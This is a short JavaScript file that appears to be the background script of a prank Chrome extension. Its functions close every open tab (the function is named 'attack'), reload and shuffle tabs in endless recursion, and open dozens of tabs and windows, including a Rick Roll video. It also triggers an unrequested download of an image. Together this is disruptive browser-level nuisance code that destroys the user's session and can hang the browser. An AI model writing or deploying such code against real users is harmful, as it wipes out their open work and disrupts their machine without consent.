getRandomInt = (min, max) => {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
};

attack = () => {
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach((tab) => chrome.tabs.remove(tab.id));
  });
};

reload = () => {
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach((tab) => chrome.tabs.reload(tab.id));
    reload();
  });
};

move = () => {
  chrome.tabs.query({}, (tabs) => {
    const length = tabs.length;

    tabs.forEach((tab) =>
      chrome.tabs.move(tab.id, { index: getRandomInt(0, length) })
    );
    move();
  });
};

createTab = () => {
  for (var i = 0; i < 40; i++) {
    chrome.tabs.create({ url: "https://www.google.com" });
  }
};

createWindow = () => {
  for (var i = 0; i < 10; i++) {
    chrome.windows.create({
      url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
      type: "normal",
    });
  }
};

download = () => {
  console.log(chrome.downloads);
  chrome.downloads.download({
    url: "http://upload.wikimedia.org/wikipedia/commons/6/6e/Moonbeam_UFO.JPG",
    filename: "ufo.jpg",
  });
};
